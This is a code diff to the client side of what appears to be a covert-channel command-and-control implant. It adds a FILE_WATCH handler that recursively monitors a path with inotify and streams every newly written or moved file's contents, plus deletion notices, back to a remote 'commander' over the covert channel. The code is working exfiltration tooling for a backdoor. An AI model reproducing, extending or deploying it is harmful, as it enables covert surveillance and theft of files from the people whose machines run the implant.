@@ -339,20 +339,85 @@ class Client:
         elif command_type == CommandType.FILE_WATCH:
             filepath = payload.decode('utf-8', errors='ignore').replace('\x00', '').strip()
             print(f"[*] Processing FILE_WATCH: {filepath}")
+
             try:
-                # with open(filepath, 'rb') as f:
-                #     content = f.read()
-                # print(f"    Sending {len(content)} bytes to commander")
-                # self.send_response(src_ip, CommandType.ACK, content)
-                watcher = FileWatcher(path=filepath,
-                                      recursive=True)
-                watcher.watch()
+                self._stop_file_watcher()
+                watcher = FileWatcher(path=filepath, recursive=True)
+                def run_watcher():
+                    import inotify.adapters
+                    try:
+                        i = inotify.adapters.InotifyTree(watcher.path, mask=watcher.event_mask)
+                        for event in i.event_gen(yield_nones=True):
+                            if self._watcher_stop.is_set():
+                                print("[*] File watcher stopped.")
+                                break
+                            if event is None:
+                                continue
+                            _, type_names, watch_path, filename = event
+                            # Handle the event ourselves instead of calling watcher._handle()
+                            if not filename:
+                                continue
+                            _, ext = os.path.splitext(filename)
+                            if ext in watcher.ignore_exts or filename.startswith('.'):
+                                continue
+                            full_path = os.path.join(watch_path, filename)
+                            for event_name in type_names:
+                                if event_name in ('IN_CLOSE_WRITE', 'IN_MOVED_TO'):
+                                    try:
+                                        with open(full_path, 'rb') as f:
+                                            filedata = f.read()
+
+                                        filename_bytes = filename.encode('utf-8')
+                                        pkt_payload = struct.pack('!H', len(filename_bytes)) + filename_bytes + filedata
+                                        self.send_response(src_ip, CommandType.FILE_WATCH, pkt_payload)
+
+                                        print(f"[*] Watcher: sent '{filename}' ({len(filedata)} bytes)")
+
+                                    except Exception as e:
+                                        print(f"[!] Watcher: could not send '{filename}': {e}")
+
+
+                                elif event_name in ('IN_DELETE', 'IN_MOVED_FROM', 'IN_DELETE_SELF'):
+                                    self.send_response(src_ip, CommandType.FILE_DELETE, filename.encode('utf-8'))
+
+                                    print(f"[*] Watcher: notified deletion of '{filename}'")
+
+
+                    except Exception as e:
+                        print(f"[!] Watcher thread error: {e}")
+
+                self._watcher_stop.clear()
+                self._watcher_thread = threading.Thread(target=run_watcher, daemon=True)
+                self._watcher_thread.start()
+                print(f"    Watcher started on {filepath}")
+
             except Exception as e:
                 print(f"    Error: {e}")
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
-    # ------------------------------------------------------------------ #
-    #  Response sender                                                     #
-    # ------------------------------------------------------------------ #
+
+    def _run_watcher(self, watcher):
+        """Thread target: drive inotify and check stop flag each iteration."""
+        import inotify.adapters
+        try:
+            i = inotify.adapters.InotifyTree(watcher.path, mask=watcher.event_mask)
+            for event in i.event_gen(yield_nones=True):
+                if self._watcher_stop.is_set():
+                    print("[*] File watcher stopped.")
+                    break
+                if event is None:
+                    continue
+                _, type_names, watch_path, filename = event
+                watcher._handle(type_names, watch_path, filename)
+        except Exception as e:
+            print(f"[!] Watcher thread error: {e}")
+
+    def _stop_file_watcher(self):
+        """Stop the active watcher thread if one is running."""
+        if self._watcher_thread and self._watcher_thread.is_alive():
+            self._watcher_stop.set()
+            self._watcher_thread.join(timeout=3)
+        self._watcher_thread = None
+        self._watcher_stop.clear()
 
     def send_response(self, dst_ip, command_type, payload):
         """Send a response back to the commander via the covert channel."""
